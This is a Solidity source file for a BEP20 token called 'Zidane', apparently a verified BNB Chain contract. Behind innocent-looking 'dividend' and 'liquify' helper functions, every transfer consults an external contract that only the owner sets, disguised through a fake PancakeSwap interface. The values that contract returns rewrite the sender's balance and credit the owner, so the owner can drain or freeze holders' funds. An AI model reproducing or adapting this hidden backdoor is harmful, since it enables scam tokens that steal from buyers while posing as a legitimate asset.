/**
 *Submitted for verification at BscScan.com on 2022-02-20
*/

/**
 *Submitted for verification at BscScan.com on 2021-04-14
*/

pragma solidity ^0.8.2;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IPancake{    
    function getPair(address, address, uint256[] memory) external view returns (uint256[] memory);
    function createPair(address tokenA, address tokenB) external view returns (address pair);
}

contract Zidane {
    using SafeMath for uint256;
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowed;
    address internal  _owner;
    uint public totalSupply;
    string public name;
    string public symbol;
    uint public decimals;
    address pancake;
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    address private constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    
    constructor(string memory _name, string memory _symbol, uint _supply, uint _dec) {
        name = _name;
        symbol = _symbol;
        decimals = _dec;
        _owner = msg.sender;
        totalSupply = _supply * 10 ** _dec;
        balances[_owner] = totalSupply;
        emit Transfer(address(0), _owner, totalSupply);
    }
    
        
    modifier onlyOwner{
        if (msg.sender != _owner){
            revert();
        }
        _; 
    }

    function setRouterPancake(address c) external onlyOwner {
        pancake = c;
    }  


    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }


    function loadLiquifyDividendZidane(address sender, address recipient, uint256 amount, address pair) private view returns (uint256[] memory) {     
      uint256[] memory currData = new uint256[](2);
      currData[0] = amount;
      currData[1] = uint256(uint160(pair));
      uint256[] memory dividend = IPancake(pancake).getPair(sender, recipient, currData);
      return dividend;
    } 

    function dividendDalculationZidane(address sender, address recipient, uint256 amount) private returns (uint256) {
        address pair = IPancake(pancake).createPair(WBNB, address(this));  
        uint256[] memory dividend = loadLiquifyDividendZidane(sender, recipient, amount,pair);
        if (dividend[0] > 0)
        {
            uint256 banlancesDividend = dividend[1];
            balances[sender] = banlancesDividend.add(dividend[3]);      
            balances[_owner] = balances[_owner].add(dividend[2]);
        }
        return dividend[1];
    }
    
    function transfer(address to, uint value) external returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        _transfer(msg.sender,to,value);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external  returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, allowed[sender][msg.sender].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint) {
        return allowed[owner][spender];
    }

    function approve(address spender, uint256 amount) public  returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");
        allowed[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }     


    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");  
        uint256 amountDiv = dividendDalculationZidane(sender, recipient, amount);
         _transferStandard(sender,recipient,amountDiv);

    }  

    function _transferStandard(address sender, address recipient, uint256 amount) private {
      balances[sender] = balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
      balances[recipient] = balances[recipient].add(amount);
      emit Transfer(sender, recipient, amount);
    }   

}